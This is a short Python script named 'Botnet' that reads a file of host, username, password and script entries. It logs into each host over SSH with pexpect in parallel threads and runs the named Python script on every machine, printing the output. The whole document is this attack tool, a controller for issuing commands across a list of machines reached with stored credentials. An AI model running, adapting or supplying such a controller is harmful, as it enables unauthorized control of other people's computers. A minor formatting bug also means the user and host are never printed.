from pexpect import pxssh
import threading
import argparse


class Botnet:
    def __init__(self, host, user, password, cmd):
        self.host = host
        self.user = user
        self.password = password

        self.session = self.login()
        if self.session:
            self.sendCommand(cmd)

    def login(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception as e:
            print(e)
            return False

    def sendCommand(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()

        print("-" * 50)
        print()
        print()

        print("commands' output ".format(self.user, self.host))
        print(self.session.before)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--b", "--botnet-list", help="Please enter the botnet list file")
    args = parser.parse_args()
    with open(args.b, "r") as file:
        ssh_list = file.readlines()

    for i in ssh_list:
        t = threading.Thread(target=Botnet, args=(i.strip("\n").split(",")[0], i.strip("\n").split(",")[1],
                                                  i.strip("\n").split(",")[2], "python " + i.strip("\n").split(",")[3]))
        t.start()
